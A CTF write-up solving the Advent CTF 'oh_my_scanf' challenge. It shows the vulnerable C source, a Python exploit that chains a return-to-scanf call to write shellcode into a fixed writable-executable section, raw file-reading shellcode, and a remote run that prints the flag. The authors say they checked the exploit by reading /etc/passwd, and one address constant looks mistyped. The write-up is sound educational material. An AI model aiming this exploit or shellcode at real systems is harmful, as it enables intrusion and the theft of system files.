### Solved by barrebas, swappage, superkojiman

Another month, another CTF! This Advent CTF runs almost the entire month of December. This challenge seemed easy at first, but turned out to be a bit more tricky!

We're given a vulnerable binary plus the C source:

```c
/* gcc -m32 -fno-stack-protector -zexecstack -o oh_my_scanf oh_my_scanf.c */
#include <stdio.h>

int main(void) {
    char name[16];

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("name: ");
    scanf("%s", name);
    printf("hi, %s\n", name);

    return 0;
}
```

This looks pretty straight-forward, right? `scanf`, an executable stack and a small buffer, oh my! A standard buffer overflow:

```bash
bas@tritonal:~/adventctf$ ulimit -c unlimited
bas@tritonal:~/adventctf$ ./oh_my_scanf 
name: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
hi, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
Segmentation fault (core dumped)
```

I checked `gdb` and `eip` was overwritten with `HHHH`, so we need 28 bytes to overflow the buffer. Next, because the stack is executable, we should be able to jump to it... but how? ALSR is enabled so we don't know the location of the stack. None of the registers contain a pointer to the shellcode, there aren't any `jmp esp` or `call esp` instructions. Bruteforcing it seemed tedious at best. We looked at writing a ROP chain, but there are very few useable gadgets. 

Thinking long and hard together with Swappage and superkojiman, we came up with several strategies. One of the suggestions by Swappage revolved around abusing `scanf` to build shellcode somewhere. superkojiman noticed that the main code section is `rwx`!

```
gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x08049000 r-xp  /home/bas/adventctf/oh_my_scanf
0x08049000 0x0804a000 r-xp  /home/bas/adventctf/oh_my_scanf
0x0804a000 0x0804b000 rwxp  /home/bas/adventctf/oh_my_scanf
0xf7e19000 0xf7e1a000 rwxp  mapped
...snip...
```

Yes, this has to be it! We can write to a section of memory that is executable *and* at a fixed location. After writing shellcode there, we simply jump to it to have our cake *and* eat it.

So I modified a ROP chain that I was fiddling with:

```python
#!/usr/bin/python
import struct

def p(x):
  return struct.pack("<L", x)

SCANF = 0x80483b0a
POPRET = 0x804835d
SCANF_STRING = 0x80495ce

payload = ""
payload += "A"*28

payload += p(SCANF)         # return-to-got, scanf
payload += p(POPRET)        # next return address
payload += p(SCANF_STRING)  # pointer to "%s", arg1 for scanf
payload += p(0x0804a040)    # pointer to readable/executable
                            # arbitrarily chosen section of code
                            # it doubles as return address
payload += "\n"             # close first scanf call

# this modified shellcode below will be read by the scanf call that results from our ROP chain.
# we need the extra "\na" to flush the buffer, i think. 
payload += "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x54\x59\x90\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag\na"

print payload

```

I used a modified version of [this shellcode](http://www.shell-storm.org/shellcode/files/shellcode-73.php). The shellcode wasn't working locally, and I narrowed it down quickly to a bad byte, `0x0c`. This was part of the `lea ecx, [esp]` instruction. I exchanged this for:

```bash
bas@tritonal:~/adventctf$ rasm2 - 
push esp
54
pop ecx
59
nop
90
```

And off we went! I verified the exploit remotely by reading `/etc/passwd` and then I guessed the name of the flag file to be `flag`. Simple, really =)

```bash
bas@tritonal:~/adventctf$ python exploit.py | nc pwnable.katsudon.org 32100
name: hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAA..].E.@..
ADCTF_Sc4NF_IS_PRe77Y_niCE
```

The flag was `ADCTF_Sc4NF_IS_PRe77Y_niCE`. In the end, the executable stack turned out to be a red herring and something more unusual was going on. Cool challenge!

